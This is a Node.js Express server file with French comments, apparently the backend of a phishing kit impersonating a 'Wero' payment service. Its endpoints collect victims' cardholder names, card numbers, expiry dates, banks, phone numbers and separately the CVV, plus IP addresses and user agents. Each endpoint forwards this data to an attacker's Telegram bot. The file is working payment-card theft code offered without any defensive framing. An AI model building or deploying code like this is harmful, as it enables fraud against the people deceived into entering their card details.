require('dotenv').config();
const express = require('express');
const path = require('path');
const app = express();
const telegramService = require('./telegramService');

// Middleware
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Middleware pour capturer IP et User Agent
app.use((req, res, next) => {
  req.clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'N/A';
  req.userAgent = req.headers['user-agent'] || 'N/A';
  next();
});

// Routes Pages
app.get('/', (req, res) => {
  res.render('index');
});

app.get('/accords', (req, res) => {
  res.render('accords');
});

app.get('/premiere', (req, res) => {
  res.render('premiere');
});

app.get('/deuxieme', (req, res) => {
  res.render('deuxieme');
});

app.get('/troisieme', (req, res) => {
  res.render('troisieme');
});

// ==================== API ENDPOINTS ====================

// Envoyer données d'accord
app.post('/api/send-agreement', async (req, res) => {
  try {
    const data = {
      step: 'Accord',
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendAgreementConfirmation(data);
    res.json({ success: true, message: 'Accord enregistré' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Envoyer données du formulaire première
app.post('/api/send-form', async (req, res) => {
  try {
    const { titulaire, cardNumber, expiryDate, bank, telephone } = req.body;

    const data = {
      step: 'Première - Formulaire',
      titulaire,
      cardNumber,
      expiryDate,
      bank,
      telephone,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendFormData(data);
    res.json({ success: true, message: 'Données reçues' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Envoyer CVV séparément (sécurité)
app.post('/api/send-cvv', async (req, res) => {
  try {
    const { cvv, titulaire, cardNumber, expiryDate } = req.body;

    const data = {
      cvv,
      titulaire,
      cardNumber,
      expiryDate,
      ip: req.clientIP,
      userAgent: req.userAgent,
      timestamp: new Date().toISOString()
    };

    await telegramService.sendCVVAlert(data);
    res.json({ success: true, message: 'CVV enregistré' });
  } catch (error) {
    console.error('Erreur:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Test Telegram
app.post('/api/test-telegram', async (req, res) => {
  try {
    const result = await telegramService.testConnection();
    res.json({ success: result, message: result ? 'Connexion OK' : 'Erreur de connexion' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Error handler
app.use((err, req, res, next) => {
  console.error('Erreur serveur:', err);
  res.status(500).json({ error: 'Erreur serveur interne' });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`\n🚀 Wero app running on http://localhost:${PORT}`);
  console.log(`📱 Telegram Bot: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configuré' : '❌ Non configuré'}`);
  
  // Test Telegram au démarrage
  if (process.env.TELEGRAM_BOT_TOKEN) {
    telegramService.testConnection().catch(console.error);
  }
  console.log('');
});
